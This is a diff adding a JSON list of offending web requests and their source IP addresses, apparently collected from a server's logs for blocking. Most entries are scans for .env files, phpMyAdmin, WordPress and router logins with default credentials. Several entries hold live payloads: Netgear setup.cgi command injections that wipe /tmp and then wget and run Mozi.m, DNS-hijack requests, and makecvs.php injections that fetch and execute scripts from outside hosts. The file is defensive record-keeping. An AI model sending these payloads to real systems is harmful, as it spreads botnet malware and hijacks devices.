@@ -1,0 +1,1098 @@
+[
+    {
+        "offense": "wp-includes",
+        "ipAddress": "185.220.102.240"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "40.78.153.184"
+    },
+    {
+        "offense": "TP/public/index.php",
+        "ipAddress": "132.232.46.210"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "135.125.42.241"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "50.249.137.89"
+    },
+    {
+        "offense": "api/jsonws/invoke",
+        "ipAddress": "45.155.205.108"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "13.65.36.150"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "129.146.120.47"
+    },
+    {
+        "offense": "/wp-includes/wlwmanifest.xml",
+        "ipAddress": "54.179.146.156"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "82.223.108.209"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "45.56.100.192"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "37.49.225.163"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "40.76.89.165"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "185.239.242.127"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "206.189.94.151"
+    },
+    {
+        "offense": "TP/public/index.php",
+        "ipAddress": "110.80.136.118"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "44.192.16.204"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "52.224.55.198"
+    },
+    {
+        "offense": "setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://115.58.115.18:53153/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1",
+        "ipAddress": "115.58.115.18"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "34.87.18.162"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "45.15.143.164"
+    },
+    {
+        "offense": "setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://59.92.178.56:58778/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1",
+        "ipAddress": "59.92.178.56"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "144.91.102.111"
+    },
+    {
+        "offense": "phpmyadmin",
+        "ipAddress": "89.248.165.7"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "192.53.173.196"
+    },
+    {
+        "offense": "boaform/admin/formLogin",
+        "ipAddress": "89.248.168.108"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "51.132.6.77"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "104.215.144.247"
+    },
+    {
+        "offense": "setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://115.58.51.161:50730/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1",
+        "ipAddress": "115.58.51.161"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "194.146.38.87"
+    },
+    {
+        "offense": "http:/www.proxylists.net/proxyjudge.php",
+        "ipAddress": "149.129.50.37"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "209.97.133.145"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "3.22.118.149"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "40.75.16.170"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "104.215.90.147"
+    },
+    {
+        "offense": "TP/public/index.php",
+        "ipAddress": "81.71.88.53"
+    },
+    {
+        "offense": "TP/public/index.php",
+        "ipAddress": "116.85.44.231"
+    },
+    {
+        "offense": "phpmyadmin/",
+        "ipAddress": "49.71.54.41"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "104.154.204.209"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "35.178.176.150"
+    },
+    {
+        "offense": "boaform/admin/formLogin?username=adminisp&psd=adminisp",
+        "ipAddress": "86.107.93.75"
+    },
+    {
+        "offense": "TP/public/index.php",
+        "ipAddress": "124.156.185.140"
+    },
+    {
+        "offense": "boaform/admin/formLogin?username=ec8&psd=ec8",
+        "ipAddress": "125.47.68.164"
+    },
+    {
+        "offense": "Admin1aa4f3a2/Login.php",
+        "ipAddress": "137.220.175.190"
+    },
+    {
+        "offense": "wp-content/uploads/dump.sql",
+        "ipAddress": "91.241.19.175"
+    },
+    {
+        "offense": "phpmyadmin/",
+        "ipAddress": "171.11.199.149"
+    },
+    {
+        "offense": "phpmyadmin/",
+        "ipAddress": "180.119.187.142"
+    },
+    {
+        "offense": "boaform/admin/formLogin?username=admin&psd=admin",
+        "ipAddress": "42.230.126.30"
+    },
+    {
+        "offense": "TP/public/index.php",
+        "ipAddress": "220.202.12.149"
+    },
+    {
+        "offense": "phpmyadmin/",
+        "ipAddress": "123.149.80.92"
+    },
+    {
+        "offense": "boaform/admin/formLogin?username=ec8&psd=ec8",
+        "ipAddress": "123.5.182.75"
+    },
+    {
+        "offense": "boaform/admin/formLogin?username=user&psd=user",
+        "ipAddress": "115.56.180.238"
+    },
+    {
+        "offense": "phpmyadmin/",
+        "ipAddress": "121.238.244.47"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "144.126.218.128"
+    },
+    {
+        "offense": "dnscfg.cgi?dnsPrimary=192.95.59.130&dnsSecondary8.8.4.4&dnsDynamic=0&dnsRefresh=1",
+        "ipAddress": "134.209.76.15"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "51.77.68.96"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "74.208.130.42"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "34.123.189.138"
+    },
+    {
+        "offense": "phpmyadmin/",
+        "ipAddress": "176.72.38.119"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "129.146.190.190"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "52.188.50.116"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "20.84.43.79"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "13.68.153.97"
+    },
+    {
+        "offense": "dnscfg.cgi?dnsPrimary=192.95.59.130&dnsSecondary8.8.4.4&dnsDynamic=0&dnsRefresh=1",
+        "ipAddress": "134.209.68.226"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "178.128.55.120"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "157.245.95.119"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "85.214.170.193"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "51.104.242.82"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "104.231.4.228"
+    },
+    {
+        "offense": "http:/5.188.210.227/echo.php",
+        "ipAddress": "5.188.210.227"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "186.155.227.234"
+    },
+    {
+        "offense": "wp-login.php",
+        "ipAddress": "106.13.54.162"
+    },
+    {
+        "offense": "phpmyadmin/",
+        "ipAddress": "94.198.137.4"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "128.199.244.247"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "40.66.49.249"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "105.159.23.243"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "23.100.124.121"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "194.127.179.44"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "142.147.97.183"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "40.87.65.115"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "129.146.106.12"
+    },
+    {
+        "offense": "setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://178.175.12.217:58763/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1",
+        "ipAddress": "178.175.12.217"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "51.103.28.227"
+    },
+    {
+        "offense": "Admin1aa4f3a2/Login.php",
+        "ipAddress": "140.112.36.193"
+    },
+    {
+        "offense": "setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://1.246.223.48:3074/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1",
+        "ipAddress": "1.246.223.48"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "54.39.243.100"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "37.120.239.83"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "34.123.127.56"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "51.178.48.120"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "13.67.46.13"
+    },
+    {
+        "offense": "phpmyadmin/",
+        "ipAddress": "211.23.45.28"
+    },
+    {
+        "offense": "Admin1aa4f3a2/Login.php",
+        "ipAddress": "110.36.228.157"
+    },
+    {
+        "offense": "phpmyadmin/scripts/setup.php",
+        "ipAddress": "211.193.41.38"
+    },
+    {
+        "offense": "boaform/admin/formLogin?username=ec8&psd=ec8",
+        "ipAddress": "103.66.79.45"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "185.220.100.248"
+    },
+    {
+        "offense": "home.php",
+        "ipAddress": "213.238.182.236"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "194.33.45.246"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "159.65.131.178"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "132.145.169.153"
+    },
+    {
+        "offense": "setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://115.56.152.11:55784/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1",
+        "ipAddress": "115.56.152.11"
+    },
+    {
+        "offense": "setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://219.155.67.133:57661/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1",
+        "ipAddress": "219.155.67.133"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "104.44.134.251"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "23.98.133.129"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "72.52.80.158"
+    },
+    {
+        "offense": "boaform/admin/formLogin",
+        "ipAddress": "37.49.229.191"
+    },
+    {
+        "offense": "boaform/admin/formLogin",
+        "ipAddress": "45.130.138.58"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "40.74.236.119"
+    },
+    {
+        "offense": "boaform/admin/formLogin?username=admin&psd=admin",
+        "ipAddress": "222.138.143.148"
+    },
+    {
+        "offense": "TP/public/index.php",
+        "ipAddress": "175.24.102.153"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "68.183.58.20"
+    },
+    {
+        "offense": "phpmyadmin/",
+        "ipAddress": "76.167.134.40"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "51.103.132.40"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "217.160.42.149"
+    },
+    {
+        "offense": "system_api.php",
+        "ipAddress": "134.209.178.232"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "193.56.29.26"
+    },
+    {
+        "offense": "boaform/admin/formLogin",
+        "ipAddress": "157.245.134.6"
+    },
+    {
+        "offense": "phpmyadmin/scripts/setup.php",
+        "ipAddress": "202.29.211.11"
+    },
+    {
+        "offense": "setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://115.55.178.198:37325/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1",
+        "ipAddress": "115.55.178.198"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "103.89.90.183"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "62.4.29.246"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "78.141.237.10"
+    },
+    {
+        "offense": "setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://113.88.210.244:50040/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1",
+        "ipAddress": "113.88.210.244"
+    },
+    {
+        "offense": "wp-includes/wlwmanifest.xml",
+        "ipAddress": "182.50.130.188"
+    },
+    {
+        "offense": "wp/wp-includes/wlwmanifest.xml",
+        "ipAddress": "182.50.130.7"
+    },
+    {
+        "offense": "wordpress/wp-includes/wlwmanifest.xml",
+        "ipAddress": "62.140.0.108"
+    },
+    {
+        "offense": "site/wp-includes/wlwmanifest.xml",
+        "ipAddress": "160.153.147.161"
+    },
+    {
+        "offense": "old/wp-includes/wlwmanifest.xml",
+        "ipAddress": "160.153.154.2"
+    },
+    {
+        "offense": "test/wp-includes/wlwmanifest.xml",
+        "ipAddress": "50.63.197.35"
+    },
+    {
+        "offense": "backup/wp-includes/wlwmanifest.xml",
+        "ipAddress": "184.168.193.98"
+    },
+    {
+        "offense": "en/wp-includes/wlwmanifest.xml",
+        "ipAddress": "184.168.46.103"
+    },
+    {
+        "offense": "dev/wp-includes/wlwmanifest.xml",
+        "ipAddress": "160.153.154.31"
+    },
+    {
+        "offense": "home/wp-includes/wlwmanifest.xml",
+        "ipAddress": "173.201.196.96"
+    },
+    {
+        "offense": "cms/wp-includes/wlwmanifest.xml",
+        "ipAddress": "159.65.64.17"
+    },
+    {
+        "offense": "main/wp-includes/wlwmanifest.xml",
+        "ipAddress": "104.238.120.7"
+    },
+    {
+        "offense": "newsite/wp-includes/wlwmanifest.xml",
+        "ipAddress": "124.156.121.192"
+    },
+    {
+        "offense": "website/wp-includes/wlwmanifest.xml",
+        "ipAddress": "188.121.41.154"
+    },
+    {
+        "offense": "portal/wp-includes/wlwmanifest.xml",
+        "ipAddress": "182.50.130.226"
+    },
+    {
+        "offense": "2019/wp-includes/wlwmanifest.xml",
+        "ipAddress": "198.71.238.8"
+    },
+    {
+        "offense": "v1/wp-includes/wlwmanifest.xml",
+        "ipAddress": "50.63.194.59"
+    },
+    {
+        "offense": "1/wp-includes/wlwmanifest.xml",
+        "ipAddress": "45.40.166.140"
+    },
+    {
+        "offense": "store/wp-includes/wlwmanifest.xml",
+        "ipAddress": "198.71.239.40"
+    },
+    {
+        "offense": "wp2/wp-includes/wlwmanifest.xml",
+        "ipAddress": "173.201.196.206"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "100.24.209.112"
+    },
+    {
+        "offense": "dnscfg.cgi?dnsPrimary=192.95.59.130&dnsSecondary8.8.4.4&dnsDynamic=0&dnsRefresh=1",
+        "ipAddress": "134.209.76.5"
+    },
+    {
+        "offense": "wp-login.php",
+        "ipAddress": "35.183.60.188"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "185.10.17.176"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "52.183.84.37"
+    },
+    {
+        "offense": "boaform/admin/formLogin",
+        "ipAddress": "50.115.174.106"
+    },
+    {
+        "offense": "wp-includes/css/css.php",
+        "ipAddress": "51.210.245.4"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "74.204.177.132"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "82.165.59.181"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "13.72.113.167"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "52.161.89.136"
+    },
+    {
+        "offense": "phpmyadmin/",
+        "ipAddress": "221.227.197.250"
+    },
+    {
+        "offense": "boaform/admin/formLogin?username=user&psd=user",
+        "ipAddress": "115.59.213.160"
+    },
+    {
+        "offense": "boaform/admin/formLogin",
+        "ipAddress": "135.125.161.252"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "209.160.107.208"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "40.124.33.30"
+    },
+    {
+        "offense": "TP/public/index.php",
+        "ipAddress": "118.89.167.33"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "23.96.18.231"
+    },
+    {
+        "offense": "tools.cgi",
+        "ipAddress": "2.57.122.97"
+    },
+    {
+        "offense": "boaform/admin/formLogin",
+        "ipAddress": "103.145.13.118"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "107.22.28.100"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "23.98.154.25"
+    },
+    {
+        "offense": "boaform/admin/formLogin",
+        "ipAddress": "149.81.137.136"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "62.210.144.142"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "77.247.127.185"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "137.116.91.11"
+    },
+    {
+        "offense": "setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://59.96.27.143:36178/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1",
+        "ipAddress": "59.96.27.143"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "104.168.215.28"
+    },
+    {
+        "offense": "setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1",
+        "ipAddress": "91.234.62.236"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "54.251.163.42"
+    },
+    {
+        "offense": "system_api.php",
+        "ipAddress": "104.131.22.83"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "34.72.107.141"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "158.101.99.36"
+    },
+    {
+        "offense": "TP/public/index.php",
+        "ipAddress": "106.75.32.254"
+    },
+    {
+        "offense": "phpmyadmin/",
+        "ipAddress": "177.142.84.193"
+    },
+    {
+        "offense": "boaform/admin/formLogin?username=user&psd=user",
+        "ipAddress": "221.15.10.110"
+    },
+    {
+        "offense": "wp-login.php",
+        "ipAddress": "80.251.219.111"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "13.68.130.242"
+    },
+    {
+        "offense": "phpmyadmin/",
+        "ipAddress": "222.90.47.16"
+    },
+    {
+        "offense": "systembc/password.php",
+        "ipAddress": "146.59.243.118"
+    },
+    {
+        "offense": "wp-login.php",
+        "ipAddress": "18.229.73.207"
+    },
+    {
+        "offense": "vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
+        "ipAddress": "45.155.205.225"
+    },
+    {
+        "offense": "setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://178.175.72.22:58964/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1",
+        "ipAddress": "178.175.72.22"
+    },
+    {
+        "offense": "phpmyadmin/",
+        "ipAddress": "49.76.105.39"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "52.188.71.165"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "40.86.211.5"
+    },
+    {
+        "offense": "phpmyadmin/",
+        "ipAddress": "46.210.126.214"
+    },
+    {
+        "offense": "setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://178.175.78.60:58955/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1",
+        "ipAddress": "178.175.78.60"
+    },
+    {
+        "offense": "phpmyadmin/",
+        "ipAddress": "58.208.232.119"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "85.208.3.18"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "45.87.212.62"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "51.178.52.100"
+    },
+    {
+        "offense": "/wp-includes/wlwmanifest.xml",
+        "ipAddress": "3.141.192.73"
+    },
+    {
+        "offense": "boaform/admin/formLogin",
+        "ipAddress": "89.248.170.112"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "196.65.234.142"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "34.70.151.91"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "67.41.199.73"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "105.155.253.195"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "3.10.205.178"
+    },
+    {
+        "offense": "muieblackcat",
+        "ipAddress": "206.81.13.218"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "51.210.111.36"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "194.33.45.47"
+    },
+    {
+        "offense": "TP/public/index.php",
+        "ipAddress": "154.113.16.226"
+    },
+    {
+        "offense": "boaform/admin/formLogin?username=admin&psd=admin",
+        "ipAddress": "119.180.108.227"
+    },
+    {
+        "offense": "images.php",
+        "ipAddress": "37.187.139.22"
+    },
+    {
+        "offense": "wp-includes/css/css.php",
+        "ipAddress": "217.160.45.39"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "103.141.136.70"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "154.16.166.14"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "40.89.162.49"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "3.83.227.144"
+    },
+    {
+        "offense": "setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://116.68.99.185:54132/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1",
+        "ipAddress": "116.68.99.185"
+    },
+    {
+        "offense": "wp-login.php",
+        "ipAddress": "54.178.182.46"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "192.53.171.158"
+    },
+    {
+        "offense": "system_api.php",
+        "ipAddress": "143.198.58.101"
+    },
+    {
+        "offense": "Admin1aa4f3a2/Login.php",
+        "ipAddress": "103.242.119.217"
+    },
+    {
+        "offense": "TP/public/index.php",
+        "ipAddress": "152.67.135.70"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "163.172.70.120"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "70.79.104.209"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "31.210.20.145"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "193.56.29.103"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "20.52.133.236"
+    },
+    {
+        "offense": "boaform/admin/formLogin?username=ec8&psd=ec8",
+        "ipAddress": "117.192.227.139"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "95.110.128.202"
+    },
+    {
+        "offense": "phpmyadmin/index.php",
+        "ipAddress": "31.10.241.8"
+    },
+    {
+        "offense": "boaform/admin/formLogin?username=adminisp&psd=adminisp",
+        "ipAddress": "202.164.138.45"
+    },
+    {
+        "offense": "setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1",
+        "ipAddress": "49.143.32.6"
+    },
+    {
+        "offense": "boaform/admin/formLogin?username=ec8&psd=ec8",
+        "ipAddress": "112.242.15.238"
+    },
+    {
+        "offense": "index.php",
+        "ipAddress": "51.154.148.41"
+    },
+    {
+        "offense": "/phpmyadmin/scripts/setup.php",
+        "ipAddress": "185.172.110.204"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "186.179.112.254"
+    },
+    {
+        "offense": "setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://210.97.85.20:50730/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1",
+        "ipAddress": "210.97.85.20"
+    },
+    {
+        "offense": "TP/public/index.php",
+        "ipAddress": "122.51.226.155"
+    },
+    {
+        "offense": "boaform/admin/formLogin",
+        "ipAddress": "45.144.225.70"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "71.236.129.89"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "96.82.253.45"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "3.87.217.172"
+    },
+    {
+        "offense": "setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://42.224.168.72:37055/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1",
+        "ipAddress": "42.224.168.72"
+    },
+    {
+        "offense": "/wp-includes/wlwmanifest.xml",
+        "ipAddress": "13.250.109.233"
+    },
+    {
+        "offense": "setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://120.83.78.54:37464/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1",
+        "ipAddress": "120.83.78.54"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "95.110.128.25"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "103.215.223.91"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "193.142.59.11"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "167.71.217.154"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "34.201.147.61"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "194.49.69.174"
+    },
+    {
+        "offense": "include/makecvs.php?Event=%60php%20-r%20%22file_put_contents%28%5C%22.setup%5C%22%2C%20file_get_contents%28%5C%22http%3A%2F%2Fntxkg0la99w.zapto.org%2Fsetup%5C%22%29%29%3B%22%3Bcurl%20http%3A%2F%2Fntxkg0la99w.zapto.org%2Fsetup%20-O%3Bcurl%20http%3A%2F%2Fntxkg0la99w.zapto.org%2Fsetup.py%20-O%3Bphp%20-r%20%22file_put_contents%28%5C%22.setup.py%5C%22%2C%20file_get_contents%28%5C%22http%3A%2F%2Fntxkg0la99w.zapto.org%2Fsetup.py%5C%22%29%29%3B%22%3Bwget%20http%3A%2F%2Fntxkg0la99w.zapto.org%2Fsetup%20-O%20.setup%3Bwget%20http%3A%2F%2Fntxkg0la99w.zapto.org%2Fsetup.py%20-O%20.setup.py%3Bchmod%20777%20.setup.py%3Bchmod%20777%20.setup%3Bpython2%20.setup.py%7C%7Cpython2.7%20.setup.py%7C%7Cpython%20.setup.py%7C%7C.%2F.setup.py%7C%7C.%2F.setup%60",
+        "ipAddress": "129.213.85.250"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "206.81.14.128"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "23.101.213.72"
+    },
+    {
+        "offense": "setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://117.242.211.208:34238/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1",
+        "ipAddress": "117.242.211.208"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "129.213.100.194"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "192.228.100.100"
+    },
+    {
+        "offense": "include/makecvs.php?Event=%60php%20-r%20%22file_put_contents%28%5C%22.benchmark%5C%22%2C%20file_get_contents%28%5C%22http%3A%2F%2Fkek.gay%2Fbenchmark%5C%22%29%29%3B%22%3Bcurl%20http%3A%2F%2Fkek.gay%2Fbenchmark%20-O%3Bcurl%20http%3A%2F%2Fkek.gay%2Fbenchmark.py%20-O%3Bphp%20-r%20%22file_put_contents%28%5C%22.benchmark.py%5C%22%2C%20file_get_contents%28%5C%22http%3A%2F%2Fkek.gay%2Fbenchmark.py%5C%22%29%29%3B%22%3Bwget%20http%3A%2F%2Fkek.gay%2Fbenchmark%20-O%20.benchmark%3Bwget%20http%3A%2F%2Fkek.gay%2Fbenchmark.py%20-O%20.benchmark.py%3Bchmod%20777%20.benchmark.py%3Bchmod%20777%20.benchmark%3Bpython2%20.benchmark.py%7C%7Cpython2.7%20.benchmark.py%7C%7Cpython%20.benchmark.py%7C%7C.%2F.benchmark.py%7C%7C.%2F.benchmark%60",
+        "ipAddress": "47.226.104.247"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "45.79.128.142"
+    },
+    {
+        "offense": "system_api.php",
+        "ipAddress": "67.205.157.196"
+    },
+    {
+        "offense": "setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://120.6.141.142:35846/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1",
+        "ipAddress": "120.6.141.142"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "34.83.97.177"
+    },
+    {
+        "offense": "sugarcrm//index.php?action=Login&module=Users",
+        "ipAddress": "51.140.34.204"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "209.58.142.160"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "40.121.198.68"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "207.246.108.203"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "3.15.162.43"
+    },
+    {
+        "offense": "boaform/admin/formLogin",
+        "ipAddress": "37.49.229.154"
+    },
+    {
+        "offense": "index.php",
+        "ipAddress": "212.175.97.107"
+    },
+    {
+        "offense": ".env",
+        "ipAddress": "2.50.87.207"
+    },
+    {
+        "offense": "setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://125.41.242.100:48056/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1",
+        "ipAddress": "125.41.242.100"
+    },
+    {
+        "offense": "wp-includes/wlwmanifest.xml",
+        "ipAddress": "162.253.68.117"
+    },
+    {
